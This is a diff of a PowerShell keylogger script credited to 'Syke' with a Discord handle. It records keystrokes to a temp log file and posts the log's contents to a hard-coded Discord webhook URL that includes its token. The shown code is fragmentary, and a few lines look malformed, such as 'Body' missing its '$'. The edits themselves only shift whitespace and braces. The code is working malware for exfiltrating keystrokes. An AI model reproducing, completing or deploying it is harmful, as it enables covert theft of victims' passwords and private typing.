@@ -1,10 +1,12 @@
 # MADE BY SYKE
 # Discord: syke#1166 / Syke#1166
+
 $webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
             Body = @{
   
   'content' = get-content $env:temp/keylogger.log
 }
+
 # keylogger
 function KeyLogger($logFile="$env:temp/keylogger.log") {
 
@@ -52,6 +54,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
             [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+            }
 
             
 Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
@@ -62,7 +65,7 @@ Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
       }
     }
   }
-  }
+  
 
 
 
